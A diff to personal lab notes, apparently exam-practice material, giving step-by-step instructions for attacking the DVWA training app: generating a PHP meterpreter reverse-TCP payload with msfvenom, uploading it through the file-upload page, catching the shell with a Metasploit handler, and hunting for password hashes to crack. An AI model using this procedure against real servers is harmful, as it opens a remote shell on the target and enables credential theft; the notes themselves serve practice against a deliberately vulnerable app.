@@ -4,11 +4,25 @@ First Method:
 Creating reverse TCP
 service postgresql start
 msvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f raw
-Copy the raw and create a file upload.php and upload in DVWA web site
+copy the text and create file upload.php on desktop
+open browser http://172.16.0.17:8080/DVWA
+login with admin/password
+DVWA Security -> keep it low and submit
+File Upload -> upload the file from Desktop "upload.php"
+uploaded file in location: /hackable/uploads/upload.php
 
-msfconsole
-use exploit
+parrot OS: sudo su :: cd
+msfconsole -> use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+set LPORT 4444
+run
 
+Open: http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php
+back to terminal:
+sessions -i 1
+sysinfo
+Find the hash file and use website to decrypt
 
 Second Method:
 Go to Command Injection after login to DVWA website by keeping the Security as Low.
